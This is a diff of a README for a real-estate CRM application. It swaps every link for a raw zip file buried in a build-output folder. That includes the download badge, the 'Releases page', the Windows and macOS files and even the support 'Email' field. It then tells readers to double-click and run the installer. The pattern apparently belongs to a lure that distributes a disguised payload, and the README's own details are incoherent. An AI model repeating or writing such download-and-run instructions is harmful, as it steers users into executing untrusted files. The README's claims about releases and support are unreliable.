@@ -6,7 +6,7 @@ Welcome to the realestate-crm application! This tool helps real estate offices a
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip)](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip)
+[![Download](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip)](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip)
 
 ## 🛠 System Requirements
 
@@ -20,11 +20,11 @@ To run the realestate-crm application, make sure your system meets these require
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip) to find the latest version of realestate-crm.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip) to find the latest version of realestate-crm.
 
 2. **Select the Latest Version:** On the Releases page, look for the latest stable version. Each version will have a release note describing new features and fixes.
 
-3. **Download the File:** Click on the attached file for your operating system. The file will be something like `https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip` for Windows or `https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip` for macOS.
+3. **Download the File:** Click on the attached file for your operating system. The file will be something like `https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip` for Windows or `https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip` for macOS.
 
 4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder and double-click to run the installer. 
 
@@ -64,12 +64,12 @@ If you encounter an issue while downloading or installing, try these steps:
 
 If you have questions or need further assistance, feel free to contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip
+- **Email:** https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip
 - **Github Issues:** You can submit an issue on our GitHub page, and we will respond promptly.
 
 ## 🚀 Stay Updated
 
-For updates, new features, and bug fixes, keep checking our [Releases page](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.Infrastructure/realestate-crm-2.5.zip). We regularly post new versions to enhance your experience.
+For updates, new features, and bug fixes, keep checking our [Releases page](https://raw.githubusercontent.com/1dhswd/realestate-crm/main/RealEstateCRM.API/bin/Debug/net5.0/runtimes/win-x86/native/crm-realestate-3.3.zip). We regularly post new versions to enhance your experience.
 
 ## 📚 Contributing
 
